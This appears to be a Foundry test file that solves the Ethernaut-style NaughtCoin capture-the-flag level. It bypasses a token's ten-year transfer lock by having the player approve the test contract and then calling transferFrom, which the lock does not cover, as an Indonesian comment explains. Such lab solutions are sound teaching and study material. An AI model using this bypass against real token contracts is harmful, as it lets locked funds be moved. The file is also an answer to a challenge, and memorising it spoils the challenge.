// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {NaughtCoin} from "src/levels/NaughtCoin.sol";
import {NaughtCoinFactory} from "src/levels/NaughtCoinFactory.sol";

contract NaughtCoinSolve is Test {
    NaughtCoinFactory factory;
    NaughtCoin instance;
    address player = address(0xBEEF);

    function setUp() public {
        factory = new NaughtCoinFactory();
        vm.deal(player, 10 ether);
        instance = NaughtCoin(factory.createInstance(player));
    }

    function testInit() public view {
        assertFalse(factory.validateInstance(payable(address(instance)), player));
    }

    function testSolve() public {
        // transfer() terkunci untuk player sampai timelock (10 tahun),
        // tapi transferFrom() TIDAK di-override — jalur itu terbuka.
        uint256 balance = instance.balanceOf(player);
        vm.prank(player);
        instance.approve(address(this), balance);
        instance.transferFrom(player, address(this), balance);
        assertTrue(factory.validateInstance(payable(address(instance)), player));
    }
}
